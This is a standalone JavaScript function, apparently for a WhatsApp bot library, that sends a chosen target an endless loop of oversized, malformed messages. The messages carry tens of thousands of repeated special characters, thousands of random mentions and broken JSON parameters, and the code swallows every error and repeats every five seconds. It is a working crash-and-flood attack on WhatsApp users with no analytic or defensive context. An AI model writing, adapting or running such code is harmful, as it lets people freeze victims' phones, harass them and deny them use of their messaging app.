async function blankInfinity(sock, target) {
  while (true) {
    try {
      const Messages = [
        "0@s.whatsapp.net",
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 5000 }, () =>
          "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
        ),
      ];

      for (let i = 0; i < 75; i++) {
        const mediaFlood = {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                body: { text: "𝗭𝗶𝗲𝗲 𝗱𝗲𝗹 𝗥𝗲𝘆... 桜🌸" },
                contextInfo: {
                  forwardingScore: 9999,
                  isForwarded: true,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  mentionedJid: Messages,
                },
                nativeFlowMessage: {
                  buttons: [
                    { name: "single_select", buttonParamsJson: "" },
                    { name: "call_permission_request", buttonParamsJson: JSON.stringify({ status: true }) },
                  ],
                  messageParamsJson: "{{".repeat(15000),
                },
              },
              extendedTextMessage: {
                text: "ꦾ".repeat(25000) + "@1".repeat(25000),
                contextInfo: {
                  stanzaId: target,
                  participant: target,
                  quotedMessage: {
                    conversation: "𝗭𝗶𝗲𝗲 𝗱𝗲𝗹 𝗥𝗲𝘆... 桜🌸" +
                      "ꦾ࣯࣯".repeat(60000) +
                      "@1".repeat(30000),
                  },
                },
                inviteLinkGroupTypeV2: "DEFAULT",
              },
            },
          },
        };

        const msg = generateWAMessageFromContent(target, mediaFlood, {});
        await sock.relayMessage(target, msg.message, {
          messageId: msg.key.id,
          statusJidList: [target],
        });
      }
    } catch (err) {
    }

    await new Promise(res => setTimeout(res, 5000));
  }
}